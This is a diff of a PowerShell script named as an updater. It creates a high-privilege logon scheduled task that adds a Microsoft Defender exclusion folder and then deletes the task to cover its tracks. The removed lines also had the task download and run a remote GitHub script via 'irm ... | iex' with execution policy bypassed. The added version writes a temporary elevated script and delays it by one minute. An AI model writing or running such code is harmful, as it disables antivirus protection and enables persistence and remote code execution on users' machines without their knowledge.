@@ -1,67 +1,67 @@
+# Define a log file path
 $logPath = "C:\Windows\Temp\updater_log.txt"
+
 function Write-Log {
-    param($msg)
-    $timestamp = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-    $timestamp | Out-File -FilePath $logPath -Append -Encoding utf8
+    param ($msg)
+    $ts = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+    $ts | Out-File -FilePath $logPath -Append -Encoding utf8
 }
 
-Write-Log "Script executed by user: $([Environment]::UserName)"
+Write-Log "\uD83D\uDD52 Boot-time script executed. Preparing 1-minute delayed task..."
 
-$exclusionFolder = "$env:USERPROFILE\TestSafeFolder"
+# Task Name
+$taskName = "UpdaterUACDelayed"
 
-# Check if running as SYSTEM or not elevated
-$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
-$principal = New-Object Security.Principal.WindowsPrincipal($identity)
-$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-$isSystem = $env:USERPROFILE -like "*systemprofile*"
+# Clean up old task if any
+schtasks /Delete /TN $taskName /F | Out-Null
 
-if (-not $isAdmin -or $isSystem) {
-    Write-Log "⏳ Not in interactive user context or not admin. Deferring to scheduled task..."
+# Path to temporary elevated script
+$tempScriptPath = "$env:TEMP\exclusion_elevated.ps1"
 
-    $taskXml = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Actions Context="Author">
-    <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>-ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex"</Arguments>
-    </Exec>
-  </Actions>
-</Task>
+# Elevated script content
+$elevatedScript = @"
+# Elevation logic
+\$logPath = '$logPath'
+function Write-Log {
+    param (\$msg)
+    \$ts = "[{0}] \$msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+    \$ts | Out-File -FilePath \$logPath -Append -Encoding utf8
+}
+
+Write-Log "\u26A1 Elevated exclusion script started as: \$(whoami)"
+
+# Define folder to exclude
+\$folder = "\$env:USERPROFILE\TestSafeFolder"
+if (-not (Test-Path \$folder)) {
+    New-Item -ItemType Directory -Force -Path \$folder | Out-Null
+    Write-Log "Created folder: \$folder"
+}
+
+# Try adding exclusion
+try {
+    Add-MpPreference -ExclusionPath \$folder -ErrorAction Stop
+    Write-Log "\u2705 Successfully added exclusion: \$folder"
+} catch {
+    Write-Log "\u274C Failed to add exclusion: \$folder. Error: \$_"
+}
+
+# Clean up task
+schtasks /Delete /TN '$taskName' /F | Out-Null
+Write-Log "\uD83D\uDDD1 Deleted scheduled task: $taskName"
 "@
 
-    $taskPath = "$env:TEMP\UpdaterUACTrigger.xml"
-    $taskXml | Out-File -FilePath $taskPath -Encoding Unicode
-    schtasks.exe /Create /TN "UpdaterUACTrigger" /XML $taskPath /F | Out-Null
-    Remove-Item $taskPath -Force
-    Write-Log "✅ Scheduled task 'UpdaterUACTrigger' created."
-    exit
-}
+# Write temp elevated script to file
+$elevatedScript | Out-File -FilePath $tempScriptPath -Encoding utf8
 
-Write-Log "🛠 Running as admin. Attempting to add exclusions..."
+# Payload to run elevated script
+$payload = "powershell.exe -ExecutionPolicy Bypass -File `"$tempScriptPath`""
 
-try {
-    if (-Not (Test-Path $exclusionFolder)) {
-        New-Item -Path $exclusionFolder -ItemType Directory -Force | Out-Null
-    }
+# Create scheduled task with delay
+schtasks /Create /TN $taskName `
+    /TR $payload `
+    /SC ONLOGON `
+    /RL HIGHEST `
+    /DELAY 0001:00 `
+    /F | Out-Null
 
-    Add-MpPreference -ExclusionPath $exclusionFolder -ErrorAction Stop
-    Write-Log "✅ Added exclusion: $exclusionFolder"
-} catch {
-    Write-Log "❌ Failed to add exclusion: $exclusionFolder. Error: $_"
-}
-
-# Clean up scheduled task if it exists
-schtasks.exe /Delete /TN "UpdaterUACTrigger" /F 2>$null
-Write-Log "🧹 Deleted scheduled task: UpdaterUACTrigger (if it existed)"
+Write-Log "\u2705 Scheduled task '$taskName' created to run 1 minute after login."
